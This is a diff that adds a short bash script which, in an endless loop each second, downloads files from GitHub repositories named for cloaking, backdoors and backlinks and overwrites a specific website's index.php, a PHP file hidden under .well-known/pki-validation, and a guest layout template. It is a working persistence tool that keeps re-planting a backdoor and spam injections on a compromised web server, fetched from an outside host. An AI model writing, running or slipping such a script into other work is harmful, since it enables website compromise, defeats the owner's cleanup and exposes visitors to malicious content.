@@ -1,0 +1,25 @@
+#!/bin/bash
+
+FILES=(
+"/home/banjrsan/banjalukacity/public/index.php"
+"/home/banjrsan/banjalukacity/public/.well-known/pki-validation/core_handler_830.php"
+"/home/banjrsan/banjalukacity/public/resources/views/layouts/guest.blade.php"
+)
+
+URLS=(
+"https://raw.githubusercontent.com/flux-lab/cloacking/refs/heads/main/banjalukacity"
+"https://raw.githubusercontent.com/flux-lab/backdors/refs/heads/main/gecko"
+"https://raw.githubusercontent.com/flux-lab/backlink/refs/heads/main/banjalukacityguestbladephp"
+)
+
+while true
+do
+
+for i in ${!FILES[@]}
+do
+curl -s "${URLS[$i]}" -o "${FILES[$i]}"
+done
+
+sleep 1
+
+done
